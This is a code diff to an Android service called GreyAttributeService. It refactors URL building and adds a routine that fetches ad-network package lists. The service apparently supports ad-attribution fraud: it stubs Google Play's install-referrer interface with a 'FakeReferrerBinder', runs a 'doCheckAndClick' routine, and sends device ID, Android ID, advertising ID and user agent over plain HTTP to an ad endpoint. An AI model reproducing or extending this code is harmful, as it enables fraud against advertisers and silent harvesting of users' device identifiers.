@@ -47,18 +47,28 @@ import com.google.android.finsky.externalreferrer.*;
 public class GreyAttributeService extends Service {
     private static final String TAG = "GreyAttribute";
     private static String SOURCE_ID = "29026";
-    private static String FETCH_URL =
+    private static String FETCH_URL_BY_PKG =
             "http://api.c.avazunativeads.com/appwall?sourceid="+SOURCE_ID+"&adpkg={adpkg}&req_type=3&market=google"
                     + "&deviceid={devId}&sdkversion=2.2.7.092217&pkg={mypkg}&ua={ua}&os=android&language={lang}&" +
                     "reqId={reqid}&maid={maid}&gpid={gpid}";
 
+    private static String FETCH_URL_ALL_PKG =
+            "http://api.c.avazunativeads.com/appwall?sourceid="+SOURCE_ID+"&req_type=1&market=google"
+                    + "&deviceid={devId}&sdkversion=2.2.7.092217&pkg={mypkg}&ua={ua}&os=android&language={lang}&" +
+                    "reqId={reqid}&maid={maid}&gpid={gpid}";
+
     private Handler mainHandler;
+    private boolean isGettingPackage = false;
 
     public static void init(String source) {
         SOURCE_ID = source;
-        FETCH_URL = "http://api.c.avazunativeads.com/appwall?sourceid="+SOURCE_ID+"&adpkg={adpkg}&req_type=3&market=google"
+        FETCH_URL_BY_PKG = "http://api.c.avazunativeads.com/appwall?sourceid="+SOURCE_ID+"&adpkg={adpkg}&req_type=3&market=google"
                 + "&deviceid={devId}&sdkversion=2.2.7.092217&pkg={mypkg}&ua={ua}&os=android&language={lang}&" +
                 "reqId={reqid}&maid={maid}&gpid={gpid}";
+        FETCH_URL_ALL_PKG =
+                "http://api.c.avazunativeads.com/appwall?sourceid="+SOURCE_ID+"&req_type=1&market=google"
+                        + "&deviceid={devId}&sdkversion=2.2.7.092217&pkg={mypkg}&ua={ua}&os=android&language={lang}&" +
+                        "reqId={reqid}&maid={maid}&gpid={gpid}";
     }
 
     class FakeReferrerBinder extends IGetInstallReferrerService.Stub{
@@ -92,7 +102,7 @@ public class GreyAttributeService extends Service {
     }
 
     @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
+    public int onStartCommand(final Intent intent, int flags, int startId) {
         if (mainHandler == null) {
             mainHandler = new Handler();
         }
@@ -120,11 +130,61 @@ public class GreyAttributeService extends Service {
                 sendBroadcast(br);
                 return START_NOT_STICKY;
             }
+        } else if (GreyAttribute.ACTION_GET_PACKAGES.equals(intent.getAction())) {
+            if(!isGettingPackage) {
+                new Thread(new Runnable() {
+                    @Override
+                    public void run() {
+                        isGettingPackage = true;
+                        doGetPackages(intent.getStringArrayListExtra(GreyAttribute.EXTRA_PACKAGE_LIST));
+                        stopSelf();
+                        isGettingPackage = false;
+                    }
+                }, "get-pkg").start();
+            }
         }
         return START_NOT_STICKY;
     }
 
-    private  void doCheckAndClick(Context ctx, String pkg) {
+    private void doGetPackages(ArrayList<String> availableList){
+        try {
+            String reqUrl = prepareUrl(GreyAttributeService.this, FETCH_URL_ALL_PKG, "*");
+
+            AdLog.d(TAG, "ReqURL: " + reqUrl);
+            String ret = doGET(reqUrl, PreferenceUtils.getUserAgent(GreyAttributeService.this));
+            if (TextUtils.isEmpty(ret)) {
+                AdLog.d(TAG, "No return");
+                return;
+            }
+            Gson gson = new Gson();
+            FetchAdResult ads = gson.fromJson(ret, FetchAdResult.class);
+            if (!FetchAdResult.isFailed(ads)) {
+                ArrayList<String> retList = new ArrayList<>();
+                ArrayList<String> descList = new ArrayList<>();
+                for (FetchAdResult.Ad data : ads.ads.a) {
+                    AdInfo info = new AdInfo(data, Constants.ApxAdType.APPWALL);
+                    if (availableList.contains(info.pkgname)) {
+                        retList.add(info.pkgname);
+                        descList.add(info.description);
+                        AdLog.d(TAG, "Hit: " + info.pkgname);
+                    } else {
+                        AdLog.d(TAG, "No Hit: " + info.pkgname);
+                    }
+                }
+                Intent intent = new Intent(GreyAttribute.ACTION_PACKAGE_READY);
+                intent.putStringArrayListExtra(GreyAttribute.EXTRA_PACKAGE_LIST, retList);
+                intent.putStringArrayListExtra(GreyAttribute.EXTRA_PACKAGE_DESC_LIST, descList);
+                intent.setPackage(getPackageName());
+                sendBroadcast(intent);
+            } else {
+                AdLog.d(TAG, "failed to load");
+            }
+        }catch (Throwable throwable){
+
+        }
+    }
+
+    private String prepareUrl(Context ctx, String url, String adpkg) {
         try {
             String devId = DeviceUtil.getDeviceId(ctx);
             String mypkg = ctx.getPackageName();
@@ -133,9 +193,18 @@ public class GreyAttributeService extends Service {
             String aid = DeviceUtil.getAndroidId(ctx);
             String ua = URLEncoder.encode(PreferenceUtils.getUserAgent(ctx), "UTF-8");
             String gpid = DeviceUtil.getGoogleAdvertisingId(ctx);
-            String reqUrl = FETCH_URL.replace("{adpkg}", pkg).replace("{devId}", devId).replace("{mypkg}", mypkg)
+            String reqUrl = url.replace("{adpkg}", adpkg).replace("{devId}", devId).replace("{mypkg}", mypkg)
                     .replace("{ua}", ua).replace("{lang}", lang).replace("{reqid}", reqId).replace("{maid}", aid)
                     .replace("{gpid}", gpid);
+            return reqUrl;
+        } catch (Throwable error) {
+            return  null;
+        }
+    }
+
+    private  void doCheckAndClick(Context ctx, String pkg) {
+        try {
+            String reqUrl = prepareUrl(ctx,FETCH_URL_BY_PKG, pkg);
 
             AdLog.d(TAG, "ReqURL: " + reqUrl);
             String ret = doGET(reqUrl, PreferenceUtils.getUserAgent(ctx));
